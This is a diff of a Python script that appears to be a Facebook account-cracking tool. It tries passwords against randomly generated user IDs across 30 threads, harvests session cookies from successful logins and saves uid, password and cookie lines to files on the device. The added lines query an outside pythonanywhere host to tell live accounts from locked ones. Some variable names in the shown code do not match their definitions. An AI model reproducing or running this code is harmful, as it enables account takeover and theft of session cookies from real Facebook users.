@@ -52,9 +52,6 @@ def rndm_bd():
         fresh();print(f' (+) {cp_x} ');line();cpy = input(f' (+) {c} (Y|N) : ')
         if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
         else:cpx.append(f'y')
-        fresh();print(f' (+) {coki_x} ');line();cokiy = input(f' (+) {c} (Y|N) : ')
-        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
-        else:cokix.append(f'y')
         for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(Bhootxx)
         with tred(max_workers=30) as Tanim:
                 tl = str(len(user))
@@ -1370,13 +1367,18 @@ def rndmx(ids,pasx,tl):
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
                                 uid = po['uid']
-                                print(f'\r{g} (PAISA OK) {str(uid)} | {pas} ')
-                                print(f'\r{g} (USER AGENT) {str(user_agent)} ')
                                 coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
-                                if 'y' in cokix:print(f'\r{g} (Kid) : {coki} ')
-                                open('/sdcard/PAISA-HI-PAISA.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
-                                ok.append(str(uid))
-                                break
+                                url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
+                                reqx = requests.get(url).text
+                                if 'live' in reqx:
+                                        print(f'\r\r{G}[ATOM-OK]: {uid} | {pas}')
+                                        print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+                                        open('/sdcard/PAISAOK-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+                                        ok+=1
+                                        break
+                                if 'lock' in reqx:
+                                        print(f'\r\r{p}[LOCK]: {uid} | {pas}')
+                                        break
                         elif 'www.facebook.com' in po['error']['message']: 
                                 uid = po['error']['error_data']['uid']
                                 if 'y' in cpx:print(f'\r{r} (NO NO) {str(uid)} | {pas} ')
